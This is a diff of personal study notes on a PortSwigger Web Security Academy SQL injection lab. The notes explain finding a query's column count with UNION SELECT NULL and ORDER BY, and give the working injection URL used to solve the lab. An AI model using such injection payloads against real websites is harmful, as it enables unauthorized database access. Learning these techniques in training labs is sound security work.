@@ -91,6 +91,7 @@ https://portswigger.net/web-security/sql-injection/union-attacks
 solution video: https://www.youtube.com/watch?v=umXGHbEyW5I
 
 Explaination of video:
+
 SQLi - Product category filter
 
 End Goal: determine the number of columns returned by the query. 
@@ -133,22 +134,13 @@ select ? from table1 UNION select NULL, NULL, NULL
 -200 response code -> correct number of columns
 
 
-
 SQLi attack (way #2):  Order by operator SQL(Microsoft):
 https://learn.microsoft.com/en-us/sql/t-sql/queries/select-order-by-clause-transact-sql?view=sql-server-ver16
 
 select a, b from table1 order by 3
 
 
-script.py <url> 
-
-'+UNION+SELECT+NULL,NULL,NULL-- 
 
 
-
-
-
-
-
-
-
+Query used to solve this lab was:
+``` https://0aed007503ed3a1fa9f7494e002b00e3.web-security-academy.net/filter?category=Gifts%27+UNION+SELECT+NULL,NULL,NULL-- 
